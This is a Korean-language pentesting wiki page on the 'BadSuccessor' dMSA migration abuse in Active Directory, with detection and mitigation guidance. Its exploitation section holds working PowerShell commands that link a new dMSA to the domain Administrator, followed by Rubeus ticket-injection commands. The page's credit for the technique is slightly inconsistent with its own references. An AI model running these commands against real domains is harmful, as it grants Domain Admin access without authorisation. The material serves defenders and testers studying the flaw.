# BadSuccessor: Delegated MSA Migration Abuse를 통한 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## Overview

Delegated Managed Service Accounts (**dMSA**)는 Windows Server 2025에 포함된 **gMSA**의 차세대 successor입니다.  합법적인 migration workflow를 사용하면 관리자는 권한을 투명하게 유지하면서 *old* account(user, computer 또는 service account)를 dMSA로 교체할 수 있습니다.  이 workflow는 `Start-ADServiceAccountMigration` 및 `Complete-ADServiceAccountMigration`과 같은 PowerShell cmdlet을 통해 제공되며, **dMSA object**의 두 LDAP attribute에 의존합니다:

* **`msDS-ManagedAccountPrecededByLink`** – 대체된(old) account에 대한 *DN link*.
* **`msDS-DelegatedMSAState`**       – migration state(`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>

공격자가 OU 내부에 **임의의** dMSA를 생성하고 이 두 attribute를 직접 조작할 수 있다면, LSASS와 KDC는 dMSA를 연결된 account의 *successor*로 취급합니다.  이후 공격자가 dMSA로 인증하면 **연결된 account의 모든 권한을 상속**하게 되며, Administrator account가 연결된 경우 **Domain Admin**까지 상속할 수 있습니다.<sup>[[1]](#references)</sup>

이 기법은 2025년에 Unit 42가 **BadSuccessor**라는 이름으로 명명했습니다. 이후 Microsoft는 이 문제에 **CVE-2025-53779**를 할당하고 **2025년 8월**에 security update를 릴리스했습니다. 이 기법은 패치되지 않은 Windows Server 2025 환경과 위험한 OU delegation 검토에서 여전히 중요합니다.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Attack prerequisites

1. **Organizational Unit (OU)** 내부에서 object를 생성할 수 *있고*, 다음 중 하나 이상을 가진 account:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. LDAP 및 Kerberos에 대한 network connectivity(일반적인 domain joined 시나리오 / remote attack).<sup>[[1]](#references)</sup>

## Enumerating Vulnerable OUs

Unit 42는 각 OU의 security descriptor를 파싱하고 필요한 ACE를 강조 표시하는 PowerShell helper script를 릴리스했습니다:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
내부적으로 이 script는 `(objectClass=organizationalUnit)`에 대해 paged LDAP search를 실행하고 모든 `nTSecurityDescriptor`에서 다음을 확인합니다.

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

writable OU가 식별되면 공격은 LDAP write 3회만으로 완료됩니다.<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
복제 후 공격자는 간단히 `attacker_dMSA$`로 **logon**하거나 Kerberos TGT를 요청할 수 있습니다. Windows는 *superseded* 계정의 토큰을 생성합니다.<sup>[[1]](#references)</sup>

### 자동화

여러 공개 PoC는 password retrieval 및 ticket management를 포함한 전체 workflow를 처리합니다:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## 탐지 및 헌팅

OU에서 **Object Auditing**을 활성화하고 다음 Windows Security Events를 모니터링합니다:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** 객체 생성
* **5136** – **`msDS-ManagedAccountPrecededByLink`** 수정
* **4662** – 특정 attribute 변경
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA에 대한 TGT 발급

`4662` (attribute 수정), `4741` (computer/service account 생성), `4624` (이후 logon)를 상관 분석하면 BadSuccessor 활동을 빠르게 식별할 수 있습니다. **XSIAM**과 같은 XDR 솔루션은 바로 사용할 수 있는 query를 제공합니다(References 참조).<sup>[[2]](#references)</sup>

## 완화

* Microsoft의 **CVE-2025-53779** security update를 적용하고 모든 Windows Server 2025 domain controller의 patch level을 확인합니다.<sup>[[6]](#references)</sup>
* **최소 권한** 원칙을 적용합니다. *Service Account* 관리 권한은 신뢰할 수 있는 role에만 위임합니다.
* 명시적인 필요가 없는 OU에서 `Create Child` / `msDS-DelegatedManagedServiceAccount`를 제거합니다.
* 위에 나열된 event ID를 모니터링하고 *non-Tier-0* identity가 dMSA를 생성하거나 편집하면 alert를 발생시킵니다.

## 관련 항목


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory에서 dMSA를 악용한 권한 상승 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 정상적인 Account가 악성으로 변할 때: Delegated Managed Service Account 악용](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
